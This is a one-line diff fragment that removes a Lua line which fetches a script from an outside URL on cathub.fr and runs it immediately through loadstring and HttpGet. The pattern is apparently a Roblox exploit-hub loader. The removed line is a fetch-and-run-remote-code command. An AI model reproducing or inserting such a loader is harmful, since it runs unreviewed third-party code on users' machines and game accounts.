@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://cathub.fr/load/1ab219aac7816f061da481f25a625445"))()
